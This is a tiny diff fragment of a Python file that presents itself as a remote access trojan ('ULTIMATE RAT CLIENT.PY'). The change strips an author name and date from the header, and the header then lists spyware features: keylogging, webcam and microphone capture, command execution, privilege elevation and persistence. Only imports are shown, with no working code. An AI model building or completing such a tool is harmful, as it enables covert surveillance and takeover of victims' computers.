@@ -1,4 +1,4 @@
-# ULTIMATE RAT CLIENT.PY – NOOR UL HASSAN (DEC 2025)
+# ULTIMATE RAT CLIENT.PY
 # Features: ss, webcam, keylog, mic, open_cmd, elevate, upload, download, sysinfo, persistence
 import os, sys, time, getpass, shutil, socket, subprocess, random, platform, uuid, threading
 from io import BytesIO
